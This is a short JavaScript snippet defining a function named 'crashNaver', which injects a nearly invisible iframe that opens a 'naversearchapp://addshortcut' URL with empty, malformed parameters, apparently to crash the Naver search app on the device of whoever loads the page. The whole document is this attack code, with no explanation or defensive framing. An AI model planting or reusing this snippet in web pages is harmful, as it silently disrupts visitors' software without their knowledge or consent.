var crashNaver = function() {
  var href = 'naversearchapp://addshortcut?url=http%3A%2F%2F&icon=http%3A%2F%2F&title=naver&serviceCode=deny_naver&version=7';
  var iframe = document.createElement('iframe');
  iframe.src = href;
  iframe.style.cssText = 'width: 1px; height: 0; border: 0;';
  document.body.appendChild(iframe);
};
